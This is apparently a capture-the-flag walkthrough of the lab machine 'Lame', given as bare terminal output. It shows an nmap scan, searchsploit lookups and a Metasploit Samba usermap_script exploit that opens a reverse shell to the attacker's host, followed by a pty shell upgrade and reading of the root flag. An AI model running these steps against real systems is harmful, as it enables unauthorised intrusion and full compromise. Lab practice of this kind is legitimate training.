#nmap:
root@hacking:~$ nmap -sC -sV 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-25 19:17 EST
Nmap scan report for 10.10.10.3
Host is up (0.086s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.51
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 59.82 seconds

#searchsploit:
root@hacking:~$ searchsploit vsftpd 2.3.4
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                                       |  Path
                                                                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                               | exploits/unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

root@hacking:~$ searchsploit Samba 3.0.20
------------------------------------------------------------- ----------------------------------------
 Exploit Title                                               |  Path
                                                             | (/usr/share/exploitdb/)
------------------------------------------------------------- ----------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Ex | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                        | exploits/linux/remote/7701.txt
------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

#metasploit
msf5 exploit(multi/samba/usermap_script) > exploit 

[*] Started reverse TCP double handler on 10.10.14.51:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 0wEAZepNh9wxsUHW;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "0wEAZepNh9wxsUHW\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 3 opened (10.10.14.51:4444 -> 10.10.10.3:55887) at 2020-02-25 19:23:21 -0500

#update shell:
python -c 'import pty; pty.spawn("/bin/bash")'

root@lame:/# 
root@lame:/home/makis# cat user.txt
cat user.txt
6...............
root@lame:/# cd /root
cd /root
root@lame:/root# ls 
ls 
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
cat root.txt
9....
